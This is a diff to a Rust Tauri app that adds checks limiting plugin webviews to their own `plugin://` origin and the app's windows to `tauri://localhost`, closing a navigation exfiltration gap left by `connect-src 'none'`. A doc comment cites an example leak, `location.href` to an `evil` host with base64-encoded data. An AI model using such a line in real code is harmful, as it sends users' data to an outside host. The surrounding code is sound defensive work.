@@ -28,7 +28,7 @@ pub use registry::{Registry, STRIKES};
 
 use serde::Serialize;
 use serde_json::{json, Value};
-use tauri::{AppHandle, Manager};
+use tauri::{AppHandle, Manager, Url};
 
 /// The prefix a plugin window's label carries. Nothing else may use it: the
 /// label is what the gate below reads, so a window that borrows the prefix
@@ -52,6 +52,28 @@ pub fn plugin_of(label: &str) -> Option<&str> {
 /// answering the question here rather than inside each command.
 pub fn allowed(label: &str, command: &str) -> bool {
     plugin_of(label).is_none() || command == DOOR
+}
+
+/// Whether a plugin's webview may go to a URL.
+///
+/// Its own origin and nothing else. `connect-src 'none'` closes `fetch`,
+/// `XMLHttpRequest` and websockets and says nothing at all about navigation:
+/// without this, `location.href = 'https://evil/?d=' + btoa(seen)` leaves the
+/// machine, and a `<form method=post>` does too (spec §0.2).
+///
+/// The handler this backs fires for subframes as well as the main frame, so
+/// one rule covers both. A plugin's own page is `plugin://<name>/…`, which is
+/// what the window is built at, so the first load passes here as well.
+pub fn navigable(name: &str, url: &Url) -> bool {
+    url.scheme() == "plugin" && url.host_str() == Some(name)
+}
+
+/// Whether one of the app's own windows may go to a URL.
+///
+/// The same hook fires for subframes, and the app should have no frames at
+/// all - so this is as much a check on the app as on anything reaching it.
+pub fn app_navigable(url: &Url) -> bool {
+    url.scheme() == "tauri" && url.host_str() == Some("localhost")
 }
 
 /// A plugin folder as found on disk, for the frontend to make sense of.
